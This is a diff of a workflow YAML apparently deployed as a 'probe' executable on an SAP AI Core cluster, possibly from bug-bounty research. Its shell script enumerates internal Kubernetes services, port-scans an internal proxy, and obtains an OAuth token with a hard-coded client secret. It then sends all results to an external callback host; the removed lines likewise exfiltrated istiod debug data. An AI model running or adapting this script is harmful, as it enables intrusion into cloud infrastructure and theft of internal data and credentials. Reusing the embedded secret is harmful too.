@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "42.0.0"
+    ai.sap.com/version: "43.0.0"
 spec:
   entrypoint: main
   templates:
@@ -25,12 +25,78 @@ spec:
       - -c
       - |
         CB="https://www.masonhck.tech/ssrf.php"
-        ISTIOD="istiod.istio-system.svc.cluster.local"
-        for ep in endpointz configz registryz authorizationz; do
-          D=$(curl -s --connect-timeout 5 "http://${ISTIOD}:8080/debug/${ep}" 2>&1 | head -c 2000)
-          echo "$D" | curl -s "${CB}?src=v42-${ep}&len=${#D}" --data-urlencode "d@-" > /dev/null
+        
+        # 1. Enumerate services in new namespaces
+        echo "=== ML-TRACKING ===" >&2
+        for svc in ml-tracking mlflow tracking experiment mltracking; do
+          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
         done
-        M=$(curl -s --connect-timeout 5 "http://${ISTIOD}:15014/metrics" 2>&1)
-        NS=$(echo "$M" | grep -oP 'namespace="[^"]*"' | sort -u)
-        echo "$NS" | curl -s "${CB}?src=v42-namespaces" --data-urlencode "d@-" > /dev/null
-        echo "V42 NS=$(echo "$NS" | wc -l) DONE"
+        # Try common service names
+        for svc in server api gateway service web http; do
+          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.ml-tracking -> $ip" >&2
+        done
+        
+        echo "=== USAGE-API ===" >&2
+        for svc in usage-api usage billing metering api server; do
+          ip=$(dig +short "${svc}.usage-api.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.usage-api -> $ip" >&2
+        done
+        
+        echo "=== CONNECTIVITY-PROXY ===" >&2
+        for svc in connectivity-proxy proxy tunnel gateway; do
+          ip=$(dig +short "${svc}.connectivity-proxy.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.connectivity-proxy -> $ip" >&2
+        done
+        
+        echo "=== OPENTELEMETRY ===" >&2
+        for svc in otel-collector collector opentelemetry jaeger; do
+          ip=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.opentelemetry -> $ip" >&2
+        done
+        
+        echo "=== DYNATRACE ===" >&2
+        for svc in dynatrace oneagent activegate; do
+          ip=$(dig +short "${svc}.dynatrace.svc.cluster.local" 2>/dev/null | head -1)
+          [ -n "$ip" ] && echo "FOUND: ${svc}.dynatrace -> $ip" >&2
+        done
+        
+        # 2. HTTP probe connectivity proxy endpoints
+        echo "=== CONN PROXY DEEP ===" >&2
+        CP="100.104.7.43"
+        for port in 80 443 8080 8443 9090 20003 20004; do
+          R=$(curl -sk --connect-timeout 3 "http://${CP}:${port}/" 2>&1 | head -c 200)
+          [ -n "$R" ] && echo "PORT ${port}: $R" >&2
+        done
+        
+        # Try with our OAuth token
+        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
+        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
+        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
+        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
+          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
+        
+        echo "=== CONN PROXY WITH TOKEN ===" >&2
+        R=$(curl -sk --connect-timeout 5 \
+          -H "SAP-CP-Connectivity-Service-Token: Bearer $JWT" \
+          -H "Proxy-Authorization: Bearer $JWT" \
+          "http://${CP}:20003/" 2>&1 | head -c 300)
+        echo "20003+token: $R" >&2
+        
+        # 3. Probe ml-tracking API
+        echo "=== ML-TRACKING PROBE ===" >&2
+        # MLflow default port is 5000
+        for port in 5000 80 8080 443; do
+          for host in "ml-tracking.ml-tracking.svc.cluster.local" "mlflow.ml-tracking.svc.cluster.local" "server.ml-tracking.svc.cluster.local"; do
+            R=$(curl -sk --connect-timeout 2 "http://${host}:${port}/" 2>&1 | head -c 200)
+            [ -n "$R" ] && [ "$R" != *"resolve"* ] && echo "${host}:${port}: $R" >&2
+          done
+        done
+        
+        # 4. Send all results via callback
+        # Capture stderr to file then send
+        exec 2>/tmp/results.txt
+        cat /tmp/results.txt | curl -s "${CB}?src=v43-results" --data-urlencode "d@-" > /dev/null 2>/dev/null
+        
+        echo "V43 DONE"
